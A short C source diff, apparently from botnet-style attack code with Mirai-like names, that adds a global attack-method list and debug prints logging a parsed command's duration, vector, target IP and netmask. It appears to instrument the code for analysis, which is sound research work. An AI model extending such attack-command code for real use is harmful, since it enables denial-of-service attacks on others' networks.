@@ -10,6 +10,9 @@
 #include "attack.h"
 #include "util.h"
 
+uint8_t methods_len = 0;
+struct attack_method **methods = NULL;
+
 
 void attack_parse(char *buf, int len)
 {
@@ -104,8 +107,10 @@ void attack_parse(char *buf, int len)
 
 void attack_analysis(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
+   
     printf("[analysis] duration: %d\n", duration);
-    
+    printf("[analysis] attack vector: %d\n", vector);
+    printf("[analysis] attack target ip: %s  netmask: %d\n", targs->addr, targs->netmask);
 
 }
 
